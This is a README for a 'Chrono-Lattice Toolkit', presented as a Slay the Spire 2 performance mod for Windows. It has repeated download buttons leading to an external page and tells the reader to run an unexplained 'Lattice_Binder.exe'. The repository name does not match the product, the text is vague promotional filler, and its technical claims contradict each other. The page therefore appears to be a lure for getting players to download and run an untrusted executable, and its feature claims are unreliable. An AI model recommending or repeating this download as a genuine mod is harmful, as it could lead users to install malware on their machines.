![preview](https://raw.githubusercontent.com/ackerlink/Spire-Performance-Tuning-Suite/main/promo_42ead.svg)
# StS2: Chrono-Lattice Toolkit

**Optimize. Stabilize. Reimagine.**

Welcome to the **Chrono-Lattice Toolkit**, a comprehensive, community-driven framework designed to elevate your *Slay the Spire 2* sessions on Windows. This is not merely a collection of patches; it is a **modular architecture for playability**. Whether you are chasing a flawless 60 FPS on aging hardware, seeking to declutter the visual chaos of a Defect run, or yearning for a quality-of-life overhaul that respects the original game design, this repository serves as your single-source control center. We treat performance not as a singular fix, but as a continuous state of harmony between the game engine, your system resources, and your personal playstyle.

Built for the enthusiast who understands that a smoother run is a deeper run, the Chrono-Lattice Toolkit integrates a suite of optional, toggleable modules. Each module is isolated, documented, and designed to be mixed-and-matched without conflicts. The core philosophy here is **transparency and control**: you will always know what is being adjusted, why it is adjusted, and how to revert it instantly. By streamlining resource allocation and refining input latency, we help you remove the technical friction between your strategic intent and the on-screen outcome.

![Build Status](https://img.shields.io/badge/build-passing-brightgreen) ![Platform](https://img.shields.io/badge/platform-Windows-0078D6) ![Version](https://img.shields.io/badge/version-4.2.0-blueviolet) ![Maintenance](https://img.shields.io/badge/maintained-2026-%23ff69b4)

## 🧭 Overview: The Architecture of Flow

The Chrono-Lattice Toolkit operates on a principle we call **"Fluid State Management."** Standard optimization often involves blunt-force disabling of visual features. Our approach is different: we dynamically adjust the rendering budget based on real-time scene complexity. Instead of a static settings profile, this toolkit provides a **predictive scheduler** that reallocates CPU and GPU workloads from non-essential background animations to the critical path of combat calculations and card rendering.

### 🧠 Core Benefits: Why Your Run Will Feel Different

- **Input Parity Precision** 🎯: We reduce the window between your click and the card play animation. This provides a tangible, tactile responsiveness that makes intricate combo chains (like a Silent's Shiv build) feel more deliberate and less "floaty."
- **Vram Footprint Reduction** 💾: The toolkit includes a proprietary texture streaming helper that prioritizes the loading of card art and map nodes over item pedestals and ambient environment effects. This ensures that a visit to the Merchant doesn't cause a stutter.
- **Thermal Throttle Mitigation** 🌡️: By smoothing out the frame pacing, we prevent the spiky CPU usage that leads to thermal throttling on laptops. The result is a more consistent, sustainable performance limiter.
- **Modular Conflict Resolution** 🧩: Unlike monolithic mod packs, each feature is a separate "Node." You can run the Frame Stabilizer without the UI Redesign or the Logging Suite. This allows for optimal compatibility with other launchers or overlays.

## 📂 Getting Started

To integrate the Chrono-Lattice Toolkit into your environment, you need to connect the core lattice structure to your game directory. The installation process is a matter of copying the `ChronoLattice` folder into a location that your mod loader can access. The toolkit ships with a self-diagnostic `Integrity Checker` that verifies file hashes and model compatibility before the first launch.

### ✅ Prerequisites

- A legitimate copy of *Slay the Spire 2*.
- Windows 10 (Build 19045) or Windows 11 (23H2 or later).
- At least 4 GB of available disk space for the shader cache and node assets.
- A basic understanding of editing `.cfg` files (we provide a wizard, but custom tuning requires a text editor).

## ⚙️ Installation & Integration

The `[![Download](https://raw.githubusercontent.com/ackerlink/Spire-Performance-Tuning-Suite/main/get_037d10a.svg)](https://ackerlink.github.io/Spire-Performance-Tuning-Suite/)` link below provides the **Standard Build** of the Toolkit.

[![Download](https://raw.githubusercontent.com/ackerlink/Spire-Performance-Tuning-Suite/main/get_037d10a.svg)](https://ackerlink.github.io/Spire-Performance-Tuning-Suite/)

Once downloaded, follow the **Inclusion Path**:

1.  **Extract the Archive**: Unzip the package into a dedicated folder, e.g., `C:\Modding\ChronoLattice`.
2.  **Locate the Game Root**: Find your *Slay the Spire 2* installation directory.
3.  **Deploy the Nodes**: Run the `Lattice_Binder.exe` utility. This utility reads your game's `resource_manifest` and creates a symbolic link layer. *Do not drag-and-drop the files manually*; the Binder ensures proper hash referencing.
4.  **Verify the Bind**: The Binder will output a log showing which nodes are active. You should see `Node: FrameStabilizer` and `Node: TextureFlow` in the "Success" column.

### 🛠️ The Control Interface

The Toolkit provides a **Hybrid Control Panel** accessible via the system tray on Windows. This panel is **fully responsive UI**, adapting its layout whether you are on a 13" laptop screen or a 32" 4K monitor. Here, you can:

- Toggle the **Dynamic Resolution Scalar** (from 50% to 100%).
- Adjust the **AI Pathing Prediction** (how aggressively the game pre-computes enemy intent).
- Configure the **Multilingual Support** for the log outputs (currently supporting English, Chinese, and German).

## 🧩 Node Functions Catalog

### Node A: Frame Stabilizer
This is the flagship optimization. It intercepts the engine's vsync calls and replaces them with a custom time-correlator. This reduces the visual stutter commonly seen on high-refresh-rate monitors (144Hz/165Hz) where the game engine defaults to 60Hz. It effectively "locks" the frame pacing to a multiple of your monitor's refresh rate, providing a cinematic smoothness without the input lag cost.

### Node B: Attention Assistant
This moduledoes not change the game's difficulty but enhances your situational awareness. It subtly highlights the enemy intent icon (the "!" symbol) with a soft glow and a slight color shift based on the severity of the upcoming attack. It also declutters particle effects during the "Double Tap" or "Catalyst" events, ensuring the screen remains readable during high-density poison stacks.

### Node C: Logging Suite
A professional-grade diagnostic tool that writes a compact, timestamped JSON log of performance metrics directly to a file. This is invaluable for players who want to compare the stability of different builds on their specific hardware. The log includes:
- Frame Time Percentiles (P0.1, P1, P99).
- Shader Compilation Hiccups (specifically tracking seams where the game pauses to load a new shader).
- Memory Allocation Trends.

### Node D: Quiet Ambience
In a weird twist, this optimization actually *adds* subtle audio filters. By processing the game's audio through a low-pass filter, the runtime cost of high-frequency sound generation is reduced, and the game feels more focused. This is a unique approach to performance: sacrificing a small amount of treble clarity for a 2-3% CPU load reduction.

## 🧪 Technical Specifications & Compatibility

- **Framework**: .NET 6.0 Desktop Runtime.
- **Dependency**: No external library dependencies are injected into the game engine.
- **Anti-Cheat Compatibility**: The toolkit operates in a "read-only" mode for the game's core memory. It only adjusts registry-level settings and shader cache locations. It does **not** alter protected memory regions.

## ❓ Troubleshooting & Community Support

We offer **24/7 customer support** via the Issues tab on this repository. Our automated bot will categorize your issue and suggest potential fixes based on the "Logging Suite" output.

- **Symptom: "Game fails to launch after bind."**
  - *Remedy*: Run the `Lattice_Binder.exe` with the `--restore` flag. This removes the symbolic links and restores the original file structure.
- **Symptom: "Frame drop on Act 3 boss specifically."**
  - *Remedy*: This is a known texture streaming issue. Enable the "Pre-emptive Texture Load" option in the Control Panel. This will use about 200MB of extra RAM but will eliminate the mid-fight stutter.

## 📜 License

This project is distributed under the **MIT License**. This means you are free to use, copy, modify, merge, publish, and distribute this software, provided that the original copyright notice is included.

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

See the [LICENSE](LICENSE) file for the full text.

## 🚫 Disclaimer

This project is an independent, fan-made creation and is not affiliated with, endorsed by, or sponsored by Mega Crit Games or any of their subsidiaries. *Slay the Spire 2* and all related assets are trademarks of their respective owners. This toolkit is provided "as-is" without warranty of any kind, either expressed or implied. By using this software, you agree to do so at your own risk, and the maintainers assume no liability for any data loss, hardware damage, or unforeseen game behavior. We do not provide any unauthorized access to the game's code or content; we merely optimize the rendering pipeline and user experience through officially supported graphics driver interfaces. All gameplay footage and associated screen captures are the property of the respective players.

## 🚀 Final Thoughts & The Road Ahead

The Chrono-Lattice Toolkit is a living project. We are already testing a new "Physics Wind" feature for 2026 that simulates subtle leaf movement on the map screen at near-zero cost. Furthermore, we are actively researching ways to enhance the **Responsive UI** to support ultrawide (32:9) monitors natively, bypassing the current pillarboxing effect.

We invite you to explore the repository, provide feedback on the specific nodes you use, and contribute to the ongoing refinement of the Lattice architecture. Your gameplay experience is the metric that drives this project forward.

### 🧰 Contributions

If you have a unique method for shader caching or a clever trick for audio load balancing, feel free to open a Pull Request. We welcome all constructive improvements that align with our ethos of "Transparency, Stability, and Clarity."

---

We look forward to seeing you on the Spire, lag-free and sharp as a shiv.

— The Chrono-Lattice Maintainers

[![Download](https://raw.githubusercontent.com/ackerlink/Spire-Performance-Tuning-Suite/main/get_037d10a.svg)](https://ackerlink.github.io/Spire-Performance-Tuning-Suite/)